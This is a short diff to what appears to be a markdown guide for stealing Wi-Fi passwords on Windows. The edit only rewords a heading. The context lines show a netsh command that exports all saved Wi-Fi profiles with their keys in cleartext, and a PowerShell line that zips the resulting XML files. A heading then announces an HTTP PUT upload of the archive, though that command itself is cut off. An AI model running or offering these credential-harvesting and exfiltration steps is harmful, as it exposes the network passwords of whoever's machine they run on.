@@ -3,7 +3,7 @@
 `netsh wlan export profile key=clear` 
 _**note:**  this exports all wifi networks into `C:\Users\<user>`) directory in .xml format._
 
-#### ↓ PowerShell command to zip all XML files ↓ ####
+#### ↓ PowerShell command to zip all the XML files ↓ ####
 `Compress-Archive -U .\*.xml -DestinationPath temp.zip`
 
 #### ↓ PowerShell command to send file via Http PUT request ↓ ####
